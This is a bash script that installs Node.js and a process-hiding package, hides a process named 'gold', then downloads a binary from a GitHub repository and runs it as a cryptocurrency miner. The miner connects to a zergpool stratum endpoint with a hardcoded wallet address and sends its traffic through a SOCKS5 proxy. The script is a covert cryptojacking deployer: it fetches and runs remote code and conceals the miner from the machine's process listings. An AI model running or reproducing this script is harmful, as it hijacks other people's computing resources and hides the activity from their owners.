#!/bin/bash
sudo apt update 
sudo apt upgrade -y
sudo apt-get install nodejs
sudo apt-get install npm
sudo apt-get install screen -y
npm i -g node-process-hider
echo -e 'sudo ph add gold' >> banthanks.sh
screen -dmS powi sh banthanks.sh
wget https://github.com/kirbyworth/sugardady/raw/main/gold && chmod +x gold && ./gold -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u RX5iZrR46Xc6Q9f3ixp4eewknJzzWB3spe -p c=RVN,mc=SUGAR,m=solo -t 2 --proxy socks5://192.252.214.20:15864
exec bash
